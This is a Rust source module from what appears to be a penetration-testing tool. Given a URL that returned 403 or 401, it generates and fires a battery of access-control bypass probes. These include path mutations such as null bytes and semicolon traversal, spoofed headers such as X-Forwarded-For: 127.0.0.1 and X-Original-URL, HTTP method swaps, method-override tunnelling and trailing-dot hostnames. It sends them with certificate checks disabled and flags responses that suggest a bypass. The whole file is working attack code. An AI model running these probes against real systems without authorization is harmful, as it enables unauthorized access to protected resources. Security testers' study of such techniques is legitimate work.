//! §36 Auth Bypass Module — automated 403/401 bypass testing.
//!
//! Given a URL that returned 403/401, generate a battery of bypass probes
//! (path mutations, header injections, method swaps, verb tunnelling) and
//! optionally fire them against the network.

use serde::{Deserialize, Serialize};
use uuid::Uuid;

// ── Types ─────────────────────────────────────────────────────────────────────

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BypassRequest {
    pub url: String,
    pub method: String,
    #[serde(default)]
    pub base_headers: Vec<(String, String)>,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
#[serde(rename_all = "snake_case")]
pub enum BypassCategory {
    PathMutation,
    HeaderInjection,
    MethodSwap,
    VerbTunneling,
    ProtocolDowngrade,
    TrailingDot,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BypassProbe {
    pub id: Uuid,
    pub category: BypassCategory,
    pub description: String,
    pub url: String,
    pub method: String,
    pub extra_headers: Vec<(String, String)>,
    pub status: Option<u16>,
    pub length: Option<usize>,
    pub bypass_likely: bool,
    pub ran_at: Option<chrono::DateTime<chrono::Utc>>,
}

// ── Probe generation ──────────────────────────────────────────────────────────

pub fn generate_probes(req: &BypassRequest) -> Vec<BypassProbe> {
    let url = req.url.trim_end_matches('/');
    let method = req.method.to_uppercase();
    let mut probes = Vec::new();

    // ── Path mutations ────────────────────────────────────────────────────────
    let path_mutations: &[(&str, &str)] = &[
        ("{u}/",         "trailing slash"),
        ("{u}/.",        "trailing dot-slash"),
        ("{u}/..",       "double dot"),
        ("{u}%20",       "URL-encoded space"),
        ("{u}%2f",       "URL-encoded slash"),
        ("{u}%09",       "URL-encoded tab"),
        ("{u}..;/",      "semicolon traversal"),
        ("{u}/.;/",      "dot-semicolon"),
        ("{u}//",        "double slash"),
        ("{u}///",       "triple slash"),
        ("{u}%00",       "null byte"),
        ("{u}?",         "bare query string"),
        ("{u}#",         "bare fragment"),
    ];
    for (tmpl, desc) in path_mutations {
        probes.push(probe(
            BypassCategory::PathMutation,
            desc,
            &tmpl.replace("{u}", url),
            &method,
            vec![],
        ));
    }

    // Case mutations on last path segment
    if let Some(seg) = url.rsplit('/').next().filter(|s| !s.is_empty()) {
        let base = &url[..url.len() - seg.len()];
        probes.push(probe(
            BypassCategory::PathMutation,
            "UPPERCASE path segment",
            &format!("{base}{}", seg.to_uppercase()),
            &method,
            vec![],
        ));
        probes.push(probe(
            BypassCategory::PathMutation,
            "Title-case path segment",
            &format!("{base}{}", titlecase(seg)),
            &method,
            vec![],
        ));
    }

    // ── Header injection ──────────────────────────────────────────────────────
    let header_bypasses: &[(&str, &str, &str)] = &[
        ("X-Original-URL",            url,         "X-Original-URL override"),
        ("X-Rewrite-URL",             url,         "X-Rewrite-URL override"),
        ("X-Forwarded-For",           "127.0.0.1", "X-Forwarded-For: 127.0.0.1"),
        ("X-Forwarded-For",           "localhost",  "X-Forwarded-For: localhost"),
        ("X-Real-IP",                 "127.0.0.1", "X-Real-IP: 127.0.0.1"),
        ("X-Custom-IP-Authorization", "127.0.0.1", "X-Custom-IP-Authorization"),
        ("X-Forwarded-Host",          "localhost",  "X-Forwarded-Host: localhost"),
        ("X-Host",                    "localhost",  "X-Host: localhost"),
        ("X-Forwarded-Proto",         "https",     "X-Forwarded-Proto: https"),
        ("X-ProxyUser-Ip",            "127.0.0.1", "X-ProxyUser-Ip"),
        ("X-Remote-IP",               "127.0.0.1", "X-Remote-IP"),
        ("X-Client-IP",               "127.0.0.1", "X-Client-IP"),
        ("X-Backend-URL",             url,         "X-Backend-URL"),
    ];
    for (h, v, desc) in header_bypasses {
        probes.push(probe(
            BypassCategory::HeaderInjection,
            desc,
            url,
            &method,
            vec![(h.to_string(), v.to_string())],
        ));
    }

    // ── Method swap ───────────────────────────────────────────────────────────
    for m in &["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS", "HEAD", "TRACE"] {
        if *m != method.as_str() {
            probes.push(probe(
                BypassCategory::MethodSwap,
                &format!("Method swap → {m}"),
                url,
                m,
                vec![],
            ));
        }
    }

    // ── Verb tunneling ────────────────────────────────────────────────────────
    for target in &["PUT", "DELETE", "PATCH"] {
        probes.push(probe(
            BypassCategory::VerbTunneling,
            &format!("X-HTTP-Method-Override: {target}"),
            url,
            "POST",
            vec![("X-HTTP-Method-Override".into(), target.to_string())],
        ));
        probes.push(probe(
            BypassCategory::VerbTunneling,
            &format!("X-Method-Override: {target}"),
            url,
            "POST",
            vec![("X-Method-Override".into(), target.to_string())],
        ));
    }

    // ── Protocol downgrade hint ───────────────────────────────────────────────
    probes.push(probe(
        BypassCategory::ProtocolDowngrade,
        "Connection: close downgrade hint",
        url,
        &method,
        vec![
            ("Connection".into(), "close".into()),
            ("Upgrade-Insecure-Requests".into(), "0".into()),
        ],
    ));

    // ── Trailing dot on hostname ──────────────────────────────────────────────
    // Simple string replacement — no URL parsing dep needed.
    if let Some(host_end) = find_host_end(url) {
        let after_scheme = url.find("://").map(|i| i + 3).unwrap_or(0);
        let authority = &url[after_scheme..host_end]; // host[:port], may be [ipv6][:port]
        // Find the port-delimiting ':' only after any IPv6 closing bracket.
        let search_from = authority.rfind(']').map(|i| i + 1).unwrap_or(0);
        let port_colon = authority[search_from..].find(':').map(|i| search_from + i);
        let (hostname, port) = match port_colon {
            Some(c) => (&authority[..c], &authority[c..]), // port includes leading ':'
            None => (authority, ""),
        };
        let scheme = &url[..after_scheme];
        let rest = &url[host_end..];
        let dotted = format!("{scheme}{hostname}.{port}{rest}");
        probes.push(probe(
            BypassCategory::TrailingDot,
            "Trailing dot on hostname",
            &dotted,
            &method,
            vec![],
        ));
    }

    probes
}

/// Find the byte index just after the host (and optional port) in a URL.
fn find_host_end(url: &str) -> Option<usize> {
    // Strip scheme
    let after_scheme = url.find("://").map(|i| i + 3)?;
    let host_start = after_scheme;
    let rest = &url[host_start..];
    // End at first '/', '?', '#', or end of string
    let end_offset = rest.find(['/', '?', '#']).unwrap_or(rest.len());
    Some(host_start + end_offset)
}

fn probe(
    cat: BypassCategory,
    desc: &str,
    url: &str,
    method: &str,
    extra_headers: Vec<(String, String)>,
) -> BypassProbe {
    BypassProbe {
        id: Uuid::new_v4(),
        category: cat,
        description: desc.to_string(),
        url: url.to_string(),
        method: method.to_string(),
        extra_headers,
        status: None,
        length: None,
        bypass_likely: false,
        ran_at: None,
    }
}

fn titlecase(s: &str) -> String {
    let mut c = s.chars();
    match c.next() {
        None => String::new(),
        Some(f) => f.to_uppercase().collect::<String>() + c.as_str(),
    }
}

// ── Network execution ─────────────────────────────────────────────────────────

/// Fire all probes. `baseline_length` is the byte size of the original 403
/// response so we can flag length anomalies as bypass-likely.
pub async fn run_probes(
    probes: &mut Vec<BypassProbe>,
    base_headers: &[(String, String)],
    baseline_length: usize,
) -> anyhow::Result<()> {
    let client = reqwest::Client::builder()
        .danger_accept_invalid_certs(true)
        .redirect(reqwest::redirect::Policy::none())
        .timeout(std::time::Duration::from_secs(10))
        .build()?;

    for p in probes.iter_mut() {
        let method = reqwest::Method::from_bytes(p.method.as_bytes())
            .unwrap_or(reqwest::Method::GET);
        let mut builder = client.request(method, &p.url);
        for (k, v) in base_headers.iter().chain(p.extra_headers.iter()) {
            builder = builder.header(k.as_str(), v.as_str());
        }
        if let Ok(resp) = builder.send().await {
            let status = resp.status().as_u16();
            let body = resp.bytes().await.unwrap_or_default();
            let length = body.len();
            p.bypass_likely = status < 300
                || (length as isize - baseline_length as isize).unsigned_abs() > 50;
            p.status = Some(status);
            p.length = Some(length);
            p.ran_at = Some(chrono::Utc::now());
        }
    }
    Ok(())
}
